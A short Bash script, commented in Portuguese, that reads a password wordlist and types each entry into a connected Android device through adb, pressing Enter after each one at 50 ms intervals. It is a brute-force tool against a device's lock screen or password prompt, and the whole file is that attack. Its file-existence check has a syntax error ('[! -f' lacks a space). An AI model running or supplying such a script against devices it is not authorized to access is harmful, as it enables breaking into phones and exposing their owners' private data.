#!/bin/bash

# Solicita ao usuário para inserir o caminho do arquivo com as senhas
read -p "Digite o caminho do arquivo com as senhas: " file_path

# Verifica se o arquivo existe
if [! -f "$file_path" ]; then
    echo "Arquivo não encontrado: $file_path"
    exit 1
fi

# Obtém o tamanho da lista de senhas
tamanho_lista=$(wc -l < "$file_path")
echo "Tamanho da lista: $tamanho_lista"

# Processa as senhas
contador=0
while IFS= read -r senha; do
    ((contador++))
    echo "Tentativa $contador de $tamanho_lista: $senha"
    
    # Envia a senha para o dispositivo
    senha_escaped="${senha//\\/\\\\}" # escape backslashes
    senha_escaped="${senha_escaped//\"/\\\"}" # escape double quotes
    echo "adb shell input text '${senha_escaped}'"
    adb shell input text "${senha_escaped}"
    echo "adb shell input keyevent 66 # Enter"
    adb shell input keyevent 66
    
    echo "Senha '${senha}' enviada com sucesso."
    
    sleep 0.05 # reduziu o intervalo de sleep entre senhas para 50ms
done < "$file_path"

echo "Todas as senhas foram enviadas."
